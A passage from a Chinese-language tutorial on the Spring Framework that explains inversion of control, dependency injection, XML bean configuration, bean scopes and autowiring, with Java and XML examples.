getUser() &#123;  \n        System.out.println(\"输出获取用户数据\");  \n &#125;  \n&#125;\n\nUserService.java Service 业务层\npackage Service;  \n  \npublic interface UserService &#123;  \n    public void getUser();  \n&#125;\n\nUserServiceImpl.java Service 业务实现类\npackage Service;  \n  \nimport DAO.UserDAO;  \nimport DAO.UserDAOImpl;  \n  \npublic class UserServiceImpl implements UserService&#123;  \n  \n    private UserDAO userDAO = new UserDAOImpl();  \n  \n @Override  \n public void getUser() &#123;  \n        userDAO.getUser();  \n &#125;  \n&#125;\n\n这个地方需要提一嘴，我们的 UserService 全程都是在调用 DAO 层的，很有趣。\n最后编写一个测试的启动类。\nTestApplication.java\nimport Service.UserService;  \nimport Service.UserServiceImpl;  \n  \npublic class TestApplication &#123;  \n    public static void main(String[] args) &#123;  \n        UserService userService = new UserServiceImpl();  \n userService.getUser();  \n &#125;  \n&#125;\n\n跑一下\n\n\nIOC 的处理情景这样子做我们正常的业务是没有问题的，但是现在来了一个客户，他要求我们用 MySQL 获取到 User，这里我们应该把 UserServiceImpl 中的这一句语句加以修改\nprivate UserDAO userDAO = new UserDAOImpl();\n\n// 修改如下\n\nprivate UserDAO userDAO = new 对应的 DAOImpl 类\n\n看着也还好对吧，只修改了一个地方，因为我们本质还是去调用 DAO 层的东西了，这是因为我们只有一个 getUser() 方法，后续我们会有更多的方法，比如 getUserId()、getUserName()、getPasswd() 等等，这时候我们要是一个个换名字，就太麻烦了。所以这里我们采用 IOC 的编程思想。\nIOC 这一编程思想光看理论有点累，所以我们可以直接用通俗易懂的代码方式来理解。\n我们在 UserServiceImpl.java 的地方加一个 setter 方法，如下\npackage Service;  \n  \nimport DAO.UserDAO;  \nimport DAO.UserDAOImpl;  \n  \npublic class UserServiceImpl implements UserService&#123;  \n  \n    private UserDAO userDAO;  \n  \n \tpublic void getUserDAO(UserDAO userDAO)&#123;  \n        this.userDAO = userDAO;  \n\t &#125;  \n  \n    @Override  \n\t public void getUser() &#123;  \n        userDAO.getUser();  \n\t &#125;  \n&#125;\n\n这一个 setter 方法就非常灵性，它灵性于何处呢？我们可以看到在 TestApplication 里面，我们可以这样操作。\nimport DAO.MysqlUserDAOImpl;  \nimport DAO.UserDAO;  \nimport Service.UserServiceImpl;  \n  \npublic class TestApplication &#123;  \n    public static void main(String[] args) &#123;  \n        UserServiceImpl userService = new UserServiceImpl();  \n userService.setUserDAO(new MysqlUserDAOImpl());  \n userService.getUser();  \n &#125;  \n&#125;\n\n对应的，应该先新建一个 UserServiceImpl 类，去实现 UserDAO 的接口。\nMysqlUserDAOImpl.java\npackage DAO;  \n  \npublic class MysqlUserDAOImpl implements UserDAO&#123;  \n    @Override  \n public void getUser() &#123;  \n        System.out.println(\"通过 MySQL 的方式获取 User\");  \n &#125;  \n&#125;\n\n\n\n我个人感觉这里和构造函数的思想其实很像，但是确实牛逼。（后续又了解到这就是依赖注入当中的构造注入）不过我个人感觉，IOC 的思想就是依赖注入 + Set 注入\n\n之前，程序是主动创建对象！控制权在程序猿手上！\n使用了 setter 注入后，程序不再具有主动性，而是变成了被动的接受对象！（主动权在客户手上）\n\n本质上解决了问题，程序员不用再去管理对象的创建；系统的耦合性大大降低，可以更专注在业务的实现上\n这是 IOC（控制反转）的原型，反转(理解)：主动权交给了用户；\n这就是 Spring 当中的 IOC！\nIOC 本质控制反转IOC(Inversion of Control)，是一种设计思想，DI(依赖注入)是实现IoC的一种方法，也有人认为DI只是IoC的另一种说法。没有IoC的程序中 , 我们使用面向对象编程 , 对象的创建与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是：获得依赖对象的方式反转了。\nIoC是Spring框架的核心内容，使用多种方式完美的实现了IoC，可以使用XML配置，也可以使用注解，新版本的Spring也可以零配置实现IoC。\nSpring容器在初始化时先读取配置文件，根据配置文件或元数据创建与组织对象存入容器中，程序使用时再从Ioc容器中取出需要的对象。\n\n\n采用XML方式配置Bean的时候，Bean的定义信息是和实现分离的，而采用注解的方式可以把两者合为一体，Bean的定义信息直接以注解的形式定义在实现类中，从而达到了零配置的目的。\n控制反转是一种通过描述（XML或注解）并通过第三方去生产或获取特定对象的方式。在Spring中实现控制反转的是IoC容器，其实现方法是依赖注入（Dependency Injection,DI）。\nSpring 通过 XML 进行装配这其实是一个蛮玄乎的地方，通过读取 xml 文件来读取类，确实玄乎。\n这里我们先编写一个 Hello 实体类\npackage dao;  \n  \npublic class Hello &#123;  \n    private String name;  \n  \n public String getName() &#123;  \n        return name;  \n &#125;  \n    public void setName(String name) &#123;  \n        this.name = name;  \n &#125;  \n  \n    public void show()&#123;  \n        System.out.println(\"Hello,\"+ name );  \n &#125;  \n&#125;\n\n再写一个 beans.xml，这用于我们 Spring 的装配\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://www.springframework.org/schema/beans  \n http://www.springframework.org/schema/beans/spring-beans.xsd\">  \n  \n &lt;!--bean就是java对象 , 由Spring创建和管理-->  \n &lt;bean id=\"hello\" class=\"dao.Hello\">  \n &lt;property name=\"name\" value=\"Spring\"/>  \n &lt;/bean>  \n&lt;/beans>\n\n这里的 id 和 class 其实和 html 里面蛮像的，id 必然是只能有一个，class 就是对应我们要去装配的类，就和 Servlet 项目里面的 class 调用是一样的，简单。\nproperty 就是给对象中的属性设置一个值。\n接着编写测试代码。\nimport dao.Hello;  \nimport org.junit.Test;  \nimport org.springframework.context.ApplicationContext;  \nimport org.springframework.context.support.ClassPathXmlApplicationContext;  \n  \n  \npublic class test &#123;  \n    @Test  \n public void test() &#123;  \n        //解析beans.xml文件 , 生成管理相应的Bean对象  \n ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\");  \n //getBean : 参数即为spring配置文件中bean的id  \n Hello hello = (Hello) context.getBean(\"hello\");  \n hello.show();  \n &#125;  \n&#125;\n\n测试成功！\n\n\n这种装配模式的思考\nHello 对象是谁创建的 ? hello 对象是由Spring创建的\nHello 对象的属性是怎么设置的 ? hello 对象的属性是由Spring容器设置的\n\n这个过程就叫控制反转 :\n\n控制 : 谁来控制对象的创建 , 传统应用程序的对象是由程序本身控制创建的 , 使用Spring后 , 对象是由Spring来创建的\n反转 : 程序本身不创建对象 , 而变成被动的接收对象 .\n\nIOC是一种编程思想，由主动的编程变成被动的接收\n这是我们通过 .xml 文件获取类，并装配；如果我们根据不同的业务进行装配呢？就和之前的场景一致，有的业务需要我们从 MySQL 读取数据，有的业务需要我们从 Oracle 读取数据，我们该如何实现呢？\n利用 IOC 的思想进行装配到我们之前讲 IOC 的案例里面，我们新建一个 beans.xml，内容如下\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">  \n  \n &lt;bean id=\"mysqlImpl\" class=\"DAO.MysqlUserDaoImpl\"/>  \n &lt;bean id=\"oracleImpl\" class=\"DAO.OracleUserDaoImpl\"/>  \n  \n &lt;bean id=\"UserServiceImpl\" class=\"Service.UserServiceImpl\">  \n &lt;!--ref引用spring中已经创建很好的对象-->  \n &lt;!--value是一个具体的值,基本数据类型-->  \n &lt;property name=\"UserDao\" ref=\"mysqlImpl\"/>  \n &lt;/bean>\n&lt;/beans>\n\n对应的启动器：\nimport DAO.MysqlUserDaoImpl;  \nimport Service.UserServiceImpl;  \nimport org.junit.Test;  \nimport org.springframework.context.ApplicationContext;  \nimport org.springframework.context.support.ClassPathXmlApplicationContext;  \n  \n  \npublic class TestApplication &#123;  \n    @Test  \n public void TestApplication() &#123;  \n        // 获取ApplicationContext；拿到Spring容器  \n ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\");  \n  \n // 需要什么就直接get什么！  \n UserServiceImpl userServiceImpl = (UserServiceImpl) context.getBean(\"UserServiceImpl\");  \n userServiceImpl.getUser();  \n &#125;  \n&#125;\n\n假若这时候需要 OracleImpl 对象，则只需在 xml 配置文件中设置 ref=&quot;oracleImpl&quot; 即可，无需去改动代码。\n\n\n总结：\n\n所有的类都要装配的 beans.xml 里面；\n所有的 bean 都要通过容器去取；\n容器里面取得的 bean，拿出来就是一个对象，用对象调用方法即可；\n\n所谓的 IOC,一句话搞定 : 对象由 Spring 来创建 , 管理 , 装配 !\nIOC 创建对象的方式这里就和当初我们探究代码块运行顺序一样，IOC 主要有两种创建的方式，其他都不行的，师傅们可以自行尝试，我这里就挂两种可行的。\n方法一、通过无参构造方法来创建User.java\npublic class User &#123;\n    private String name;\n \n    public User() &#123;\n        System.out.println(\"user无参构造方法\");\n   &#125;\n \n    public String getName() &#123;\n        return name;\n    &#125;\n \n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n \n    public void show()&#123;\n        System.out.println(\"name=\"+ name );\n    &#125;\n&#125;\n\nbeans.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n \n    &lt;bean id=\"user\" class=\"com.example.pojo.User\">\n        &lt;property name=\"name\" value=\"Drunkbaby\"/>\n    &lt;/bean>\n&lt;/beans>\n\n测试类\nimport dao.User;  \nimport org.junit.Test;  \nimport org.springframework.context.ApplicationContext;  \nimport org.springframework.context.support.ClassPathXmlApplicationContext;  \n  \n  \npublic class TestApplication &#123;  \n    @Test  \n public void TestApplication() &#123;  \n        ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\");  \n //在执行getBean的时候, user已经创建好了 , 通过无参构造  \n User user = (User) context.getBean(\"user\");  \n //调用对象的方法 . user.show();  \n &#125;  \n&#125;\n\n成功\n\n\n方法二、通过有参构造方法来创建User.java\npublic class User &#123;\n    private String name;\n \n    public User(String name)&#123;\n        this.name = name;\n    &#125;\n    public String getName() &#123;\n        return name;\n    &#125;\n \n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n \n    public void show()&#123;\n        System.out.println(\"name=\"+ name );\n    &#125;\n&#125;\n\nbeans.xml 有三种方式编写\n\n下标赋值\n\n&lt;bean id=\"user\" class=\"com.example.pojo.User\"> \n\t&lt;!-- index指构造方法 , 下标从0开始 -->   \n\t&lt;constructor-arg index=\"0\" value=\"Drunkbaby\"/>\n&lt;/bean>\n\n\n\n类型赋值（不建议使用）\n\n&lt;bean id=\"user\" class=\"com.example.pojo.User\">\n    &lt;constructor-arg type=\"java.lang.String\" value=\"Drunkbaby\"/>\n&lt;/bean>\n\n\n\n直接通过参数名（掌握）\n\n&lt;bean id=\"user\" class=\"com.example.pojo.User\">\n    &lt;!-- name指参数名 -->\n    &lt;constructor-arg name=\"name\" value=\"Drunkbaby\"/>\n&lt;/bean>\n\n结论：在配置文件加载的时候。其中管理的对象都已经初始化了（并且是单例模式，取到的对象是全局唯一）！\nUser user = (User) context.getBean(\"user\");\nUser user2 = (User) context.getBean(\"user\");\nsystem.out.println(user == user2)    //结果为true\n\n0x04 Spring 配置\n在讲这个知识点之前，我们最好先再次理解一下封装的思维，以及为什么要用 Spring 来配置。\n\nSpring 也被称为写配置写到吐，这不是没有原因的。\n确实是要写配置写到吐。\n我们前文说到 Spring 当中 有一个 bean.xml 叫做 applicationContext.xml，它是用来统领所有配置的，我们举个情景来说明一下。\n有三位程序员，他们分别是张三、李四、王五。\n张三写了代码，把程序打包到了 zhangsan.xml\n同理有 lisi.xml；wangwu.xml\n这时候，我们的 applicationContext.xml 来统领所有的配置，这样就非常符合我们的封装思想，很舒服。\n\n现在我们再回来讲一讲 Spring 的一些基础配置参数与其他的东西。\n\n别名alias 设置别名 , 为bean设置别名 , 可以设置多个别名\n&lt;!--设置别名：在获取Bean的时候可以使用别名获取-->\n&lt;alias name=\"user\" alias=\"userNew\"/>\n\n别名的理解很简单，我们要调用的时候可以调用 name，也可以调用别名。\nBean 的配置\nid：bean 的唯一标识符，也就是相当于我们学的对象名\nclass：bean 对象所对应的会限定名：包名+类型\nname：也是别名，而且 name 可以同时取多个别名\n\n&lt;bean id=\"user\" class=\"com.example.pojo.User\" name=\"u1 u2,u3;u4\">\n\n&lt;property name=\"name\" value=\"chen\"/>\n\n&lt;/bean>\n\nimportimport 一般用于团队开发使用，它可以将多个配置文件，导入合并为一个\n这就是我之前提到的那个思想\n\n张三(beans.xm1)\n李四(beans2.xm1)\n王五(beans3.xm1)\napplicationContext.xml\n\n&lt;import resource=\"beans.xm1\"/>  &lt;import resource=\"beans2.xml\"/>  &lt;import resource=\"beans3.xm1\"/>\n\n使用的时候，直接使用总的配置就可以了\n有重名的情况出现时，按照在总的xml中的导入顺序来进行创建，后导入的会重写先导入的，最终实例化的对象会是后导入xml中的那个\n0x05 DI 依赖注入\n这是我们学习 Spring 的另外一个大点，第一个大点是 IOC\n\n构造注入前文已经说过，其实就是对应的 IOC 业务情景。\nSet 方法注入\n依赖注入：本质上是 Set 注入\n\n依赖：bean 对象的创建依赖于容器\n注入：bean 对象中的所有属性由容器来注入\n\n\n\npojo 实体类Address.java\npackage pojo;  \n  \npublic class Address &#123;  \n    private String address;  \n  \n    public String getAddress() &#123;  \n        return address;  \n    &#125;  \n  \n    public void setAddress(String address) &#123;  \n        this.address = address;  \n    &#125;  \n  \n    // toString  \n&#125;\n\nStudent\npackage pojo;  \n  \nimport java.util.*;  \n  \npublic class Student &#123;  \n    private String name;  \n    private Address address;  \n    private String[] books;  \n    private List&lt;String> hobbies;  \n    private Map&lt;String,String> card;  \n    private Set&lt;String> games;  \n    private String wife;  \n    private Properties info;  \n  \n    public String getName() &#123;  \n        return name;  \n    &#125;  \n  \n    public void setName(String name) &#123;  \n        this.name = name;  \n    &#125;  \n  \n    public Address getAddress() &#123;  \n        return address;  \n    &#125;  \n  \n    public void setAddress(Address address) &#123;  \n        this.address = address;  \n    &#125;  \n  \n    public String[] getBooks() &#123;  \n        return books;  \n    &#125;  \n  \n    public void setBooks(String[] books) &#123;  \n        this.books = books;  \n    &#125;  \n  \n    public List&lt;String> getHobbies() &#123;  \n        return hobbies;  \n    &#125;  \n  \n    public void setHobbies(List&lt;String> hobbies) &#123;  \n        this.hobbies = hobbies;  \n    &#125;  \n  \n    public Map&lt;String, String> getCard() &#123;  \n        return card;  \n    &#125;  \n  \n    public void setCard(Map&lt;String, String> card) &#123;  \n        this.card = card;  \n    &#125;  \n  \n    public Set&lt;String> getGames() &#123;  \n        return games;  \n    &#125;  \n  \n    public void setGames(Set&lt;String> games) &#123;  \n        this.games = games;  \n    &#125;  \n  \n    public String getWife() &#123;  \n        return wife;  \n    &#125;  \n  \n    public void setWife(String wife) &#123;  \n        this.wife = wife;  \n    &#125;  \n  \n    public Properties getInfo() &#123;  \n        return info;  \n    &#125;  \n  \n    public void setInfo(Properties info) &#123;  \n        this.info = info;  \n    &#125;  \n  \n    @Override  \n public String toString() &#123;  \n        return \"Student&#123;\" +  \n                \"name='\" + name + '\\'' +  \n                \", address=\" + address +  \n                \", books=\" + Arrays.toString(books) +  \n                \", hobbies=\" + hobbies +  \n                \", card=\" + card +  \n                \", games=\" + games +  \n                \", wife='\" + wife + '\\'' +  \n                \", info=\" + info +  \n                '&#125;';  \n    &#125;  \n&#125;\n\nxml 注入文件beans.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">  \n  \n    &lt;bean id=\"student\" class=\"pojo.Student\">  \n        &lt;property name=\"name\" value=\"Drunkbaby\"/>  \n    &lt;/bean>  \n  \n&lt;/beans>\n\n测试类import org.junit.Test;  \nimport org.springframework.context.ApplicationContext;  \nimport org.springframework.context.support.ClassPathXmlApplicationContext;  \nimport pojo.Student;  \n  \n  \npublic class TestApplication &#123;  \n    @Test  \n public void TestApplication() &#123;  \n        ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\");  \n        //在执行getBean的时候, user已经创建好了 , 通过无参构造  \n Student student = (Student) context.getBean(\"student\");  \n        //调用对象的方法 . System.out.println(student.getName());  \n    &#125;  \n&#125;\n\n官方文档上支持非常多的注入方式，如图\n\n\n我们下面就把这些的注入方式实现一下\nBean 注入注意点：这里的值是一个引用，ref\n&lt;&lt;bean id=\"addr\" class=\"pojo.Address\">  \n    &lt;property name=\"address\" value=\"China\"/>  \n&lt;/bean>  \n  \n&lt;bean id=\"student\" class=\"pojo.Student\">  \n    &lt;property name=\"address\" ref=\"addr\"/>\n&lt;/bean>\n\n数组注入&lt;property name=\"books\">  \n    &lt;array>  \n        &lt;value>西游记&lt;/value>  \n        &lt;value>三国演义&lt;/value>  \n        &lt;value>红楼梦&lt;/value>  \n    &lt;/array>  \n&lt;/property>\n\nList 注入&lt;property name=\"hobbies\">  \n    &lt;list>  \n        &lt;value>唱&lt;/value>  \n        &lt;value>跳&lt;/value>  \n        &lt;value>rap&lt;/value>  \n        &lt;value>篮球&lt;/value>  \n    &lt;/list>  \n&lt;/property>\n\nMap 注入&lt;!--map键值对注入 -->\n&lt;property name=\"card\">\n    &lt;map>\n        &lt;entry key=\"username\" value=\"root\" />\n        &lt;entry key=\"password\" value=\"root\" />\n    &lt;/map>\n&lt;/property>\n\nset 注入&lt;!--set(可去重)注入 -->\n&lt;property name=\"games\">\n    &lt;set>\n        &lt;value>wangzhe&lt;/value>\n        &lt;value>lol&lt;/value>\n        &lt;value>galname&lt;/value>\n    &lt;/set>\n&lt;/property>\n\n空指针 null 注入&lt;!--空指针null注入 -->\n&lt;property name=\"wife\">\n    &lt;null>&lt;/null>\n&lt;/property>\n\nproperties 常量注入&lt;!--properties常量注入 -->\n&lt;property name=\"info\">\n    &lt;props>\n        &lt;prop key=\"id\">20200802&lt;/prop>\n        &lt;prop key=\"name\">cbh&lt;/prop>\n    &lt;/props>\n&lt;/property>\n\n修改 Test 类如下\nTestApplication.java\nimport org.junit.Test;  \nimport org.springframework.context.ApplicationContext;  \nimport org.springframework.context.support.ClassPathXmlApplicationContext;  \nimport pojo.Student;  \n  \n  \npublic class TestApplication &#123;  \n    @Test  \n \tpublic void TestApplication() &#123;  \n        ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\");  \n        //在执行getBean的时候, user已经创建好了 , 通过无参构造  \n \tStudent student = (Student) context.getBean(\"student\");  \n        System.out.println(student);  \n    &#125;  \n&#125;\n\n拓展方式注入在官方文档中，它们是这两个注入方式，也被称之为 c 命令与 p 命名空间注入\n\n\n其实这个地方，P 就代表着 Properties，c 就代表着 Constructor\n所以这两个注入方式也不是什么很稀奇的事情，只是减轻了我们写配置文件的繁琐程度。\n环境准备新建一个实体类：\nUser.java【注意：这里没有有参构造器！】后续我们就可以看到为什么需要加上有参构造器\npackage pojo;  \n  \npublic class User &#123;  \n    private String name;  \n    private int age;  \n  \n    public void setName(String name) &#123;  \n        this.name = name;  \n    &#125;  \n  \n    public void setAge(int age) &#123;  \n        this.age = age;  \n    &#125;  \n  \n    @Override  \n \tpublic String toString() &#123;  \n        return \"User&#123;\" +  \n                \"name='\" + name + '\\'' +  \n                \", age=\" + age +  \n                '&#125;';  \n    &#125;  \n&#125;\n\np 命名空间P 命名空间注入 : 需要在头文件中加入约束文件。也不是说完全的约束文件吧，应该算是一个命名空间，就和 mybatis 那些一样的。\np 注入代码如下\n 导入约束 : xmlns:p=\"http://www.springframework.org/schema/p\"\n \n &lt;!--P(属性: properties)命名空间 , 属性依然要设置set方法-->\n&lt;bean id=\"user\" class=\"pojo.User\" p:name=\"Drunkbaby\" p:age=\"20\" />\n\n编写一下 Test 类\nTest2.java\n\nimport org.junit.Test;  \nimport org.springframework.context.ApplicationContext;  \nimport org.springframework.context.support.ClassPathXmlApplicationContext;  \nimport pojo.Student;  \nimport pojo.User;  \n  \n  \npublic class Test2 &#123;  \n    @Test  \n public void TestApplication() &#123;  \n        ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\");  \n        //在执行getBean的时候, user已经创建好了 , 通过无参构造  \n User user = (User) context.getBean(\"user\");  \n        System.out.println(user);  \n    &#125;  \n&#125;\n\n\n\nc 命名空间注入也需要在头文件中加入约束文件\n 导入约束 : \nxmlns:c=\"http://www.springframework.org/schema/c\"\n &lt;!--C(构造: Constructor)命名空间 , 属性依然要设置set方法-->\n&lt;bean id=\"user\" class=\"com.example.pojo.User\" c:name=\"Drunkbaby\" c:age=\"20\"/>\n\n发现问题：爆红了，刚才我们没有写有参构造！\n\n\n我们是如何知道是因为有参构造的问题的呢？当时是官方文档！官方文档对于 C 命名空间的描述如图\n\n\n解决：把有参构造器加上，这里也能知道，c 就是所谓的构造器注入！\n把有参构造加上之后的 C 命名空间如图：\n\n\n输出如图\n\n\nBean 的作用域在 Spring 中，那些组成应用程序的主体及由 Spring IoC 容器所管理的对象，被称之为 bean。\n简单地讲，**bean 就是由 IoC 容器初始化、装配及管理的对象 **\n\n\n几种作用域中，request、session 作用域仅在基于 Web 的应用中使用（不必关心你所采用的是什么 Web 应用框架），只能用在基于 Web 的 Spring ApplicationContext 环境。\n单例模式（Spring 默认机制）\n关于单例模式的优缺点：单例模式的好处和缺点？为什么要用单例模式\n\n默认的模式\n\n&lt;bean id=\"user\" class=\"com.example.pojo.User\"\" c:name=\"cxk\" c:age=\"19\" scope=\"singleton\">&lt;/bean>\n\n\n原型模式（Prototype）\n\n每次从容器中 get 的时候，都产生一个新对象！\n&lt;bean id=\"user\" class=\"com.example.pojo.User\"\" c:name=\"cxk\" c:age=\"19\" scope=\"prototype\">&lt;/bean>\n\n\n其余的 request、session、application 这些只能在 Web 开放中使用！\n这些的部分我们会在内存马里面稍微提到，但是在那里面是 SpringBoot 的配置，所以会简单很多。\n\n0x06 Bean 的自动装配自动装配说明由于在手动配置 xml 过程中，常常发生字母缺漏和大小写等错误，而无法对其进行检查，使得开发效率降低。采用自动装配将避免这些错误，并且使配置简单化。\n\n自动装配是使用 spring 满足 bean 依赖的一种方法\nspring 会在应用上下文中为某个 bean 寻找其依赖的 bean。\n\nSpring 中 bean 有三种装配机制，分别是：\n\n在 xml 中显式配置；\n在 Java 中显式配置；\n隐式的 bean 发现机制和自动装配 【重要】\n\n环境就是写一个手动装配的案例，一个人，拥有猫和兔子，师傅们是不是脑子里面已经有了对于的代码了呢？pojo，beans.xml…………\n我们这里光速过一遍。\nCat.java\n\npackage pojo;  \n  \npublic class Cat &#123;  \n    public void shout()&#123;  \n        System.out.println(\"miao\");  \n    &#125;  \n&#125;\n\nRabbit.java\n\npackage pojo;  \n  \npublic class Rabbit &#123;  \n    public void shout()&#123;  \n        System.out.println(\"Zhizhi\");  \n    &#125;  \n&#125;\n\nPeople.java\n\npackage pojo;  \npublic class People &#123;  \n  \n    private Cat cat;  \n    private Rabbit rabbit;  \n    private String name;  \n  \n    @Override  \n public String toString() &#123;  \n        return \"People&#123;\" +  \n                \"cat=\" + cat +  \n                \", rabbit=\" + rabbit +  \n                \", name='\" + name + '\\'' +  \n                '&#125;';  \n    &#125;  \n  \n    public Rabbit getRabbit() &#123;  \n        return rabbit;  \n    &#125;  \n  \n    public void setRabbit(Rabbit rabbit) &#123;  \n        this.rabbit = rabbit;  \n    &#125;  \n  \n    public Cat getCat() &#123;  \n        return cat;  \n    &#125;  \n  \n    public void setCat(Cat cat) &#123;  \n        this.cat = cat;  \n    &#125;  \n  \n  \n    public String getName() &#123;  \n        return name;  \n    &#125;  \n  \n    public void setName(String name) &#123;  \n        this.name = name;  \n    &#125;  \n  \n&#125;\n\n编写 Spring 配置文件\nbeans.xml\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">  \n  \n    &lt;bean id=\"cat\" class=\"pojo.Cat\"/>  \n    &lt;bean id=\"rabbit\" class=\"pojo.Rabbit\"/>  \n  \n    &lt;bean id=\"people\" class=\"pojo.People\">  \n        &lt;property name=\"name\" value=\"Drunkbaby\"/> \n        &lt;property name=\"cat\" ref=\"cat\"/>  \n        &lt;property name=\"rabbit\" ref=\"rabbit\"/>  \n    &lt;/bean>  \n&lt;/beans>\n\n测试\nTestAutoWired.java\n\nimport org.junit.Test;  \nimport org.springframework.context.ApplicationContext;  \nimport org.springframework.context.support.ClassPathXmlApplicationContext;  \nimport pojo.People;  \n  \n  \npublic class TestAutoWired &#123;  \n    @Test  \n public void TestApplication() &#123;  \n        ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\");  \n        People people = context.getBean(\"people\",People.class);  \n        people.getCat().shout();  \n        people.getRabbit().shout();  \n    &#125;  \n&#125;\n\n\n\nbyName 和 byType 自动装配比较简单，修改 beans.xml 这一配置文件即可。\n\nbyName 的自动装配：\n\n去找 beanId 的，这个 Id 必须要是 setter 方法里有的，比如上文代码中，我们只可以 byName 的 beanId 是 cat 和 rabbit\n\nbyType 的自动装配：\n\n去找的是 class 属性，是否是类当中的，也就是寻找 Bean\n\n\n\n\nbyName 自动装配错误的实例：此时我们的 beanId 并不存在 rabbit123，但是存在 cat，所以 cat 的 shout 方法能够被正常调用。\n\n\n正确的\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">  \n  \n    &lt;bean id=\"cat\" class=\"pojo.Cat\"/>  \n    &lt;bean id=\"rabbit\" class=\"pojo.Rabbit\"/>  \n  \n    &lt;bean id=\"people\" class=\"pojo.People\" autowire=\"byName\">  \n        &lt;property name=\"name\" value=\"Drunkbaby\"/>  \n    &lt;/bean>  \n&lt;/beans>\n\n输出如图\n\n\nbyType 自动装配比较简单，如图\n\n\n要求 class 相同即可\n使用注解自动装配jdk1.5 开始支持注解，Spring2.5 开始全面支持注解。\n准备工作：利用注解的方式注入属性。\n\n在 spring 配置文件中引入 context 文件头，这里可以通过添加这一行，代表支持注解的语句，会自动引入文件头。\n\n\n&lt;context:annotation-config/>\n\n对于注解进行自动装配，对于我们最耳熟能详的，当属 @AutoWired 这个注解。\n使用 @AutoWired 注解进行自动装配@AutoWired 注解可以替代 setter 方法，这里我们可以在 People.java 这个文件夹下面动刀\nPeople.java 修改如下\n\npackage pojo;  \n  \nimport org.springframework.beans.factory.annotation.Autowired;  \n  \npublic class People &#123;  \n  \n    @Autowired  \n private Cat cat;  \n    @Autowired  \n private Rabbit rabbit;  \n    private String name;  \n  \n    @Override  \n public String toString() &#123;  \n        return \"People&#123;\" +  \n                \"cat=\" + cat +  \n                \", rabbit=\" + rabbit +  \n                \", name='\" + name + '\\'' +  \n                '&#125;';  \n    &#125;  \n  \n    public Rabbit getRabbit() &#123;  \n        return rabbit;  \n    &#125;  \n  \n    public Cat getCat() &#123;  \n        return cat;  \n    &#125;  \n  \n    public String getName() &#123;  \n        return name;  \n    &#125;  \n  \n    public void setName(String name) &#123;  \n        this.name = name;  \n    &#125;  \n  \n&#125;\n\n并且修改 beans.xml\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xmlns:context=\"http://www.springframework.org/schema/context\"  \n xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\">  \n  \n    &lt;context:annotation-config/>  \n  \n    &lt;bean class=\"pojo.Cat\"/>  \n    &lt;bean class=\"pojo.Rabbit\"/>  \n    &lt;bean id=\"people\" class=\"pojo.People\">  \n        &lt;property name=\"name\" value=\"Drunkbaby\"/>  \n    &lt;/bean>  \n&lt;/beans>\n\n输出：\n\n\nTips1:\n@Nullable 字段标记了这个注解，说明该字段可以为空\n\npublic People(@Nullable String name) &#123;  \n    this.name = name;  \n&#125;\n\nTips2:\n\n@Autowired(required=false) \n说明：false，对象可以为null；true，对象必须存对象，不能为null。\n\n//如果允许对象为null，设置required = false,默认为true\n@Autowired(required = false)\nprivate Cat cat;\n\n这里的代码就不做演示了，有兴趣的师傅们可以自行尝试。\n使用 @AutoWired + @Qualifier是用来指定 ID 的，和 byName 很像\n@Autowired不能唯一装配时，需要@Autowired+@Qualifier\n如果 @Autowired 自动装配环境比较复杂。自动装配无法通过一个注解完成的时候，可以使用 @Qualifier(value = “xxx”) 去配合 @Autowired 使用，指定一个唯一的 id 对象\n测试实验步骤：\n1、配置文件修改内容，保证类型存在对象。且名字不为类的默认名字！\n\n&lt;bean id=\"dog2\" class=\"com.example.pojo.Dog\"/>&lt;bean id=\"cat2\" class=\"com.example.pojo.Cat\"/>\n\n2、没有加Qualifier测试，直接报错\n3、在属性上添加Qualifier注解\n\n@Autowired\n@Qualifier(value = \"cat2\")\nprivate Cat cat;\n@Autowired\n@Qualifier(value = 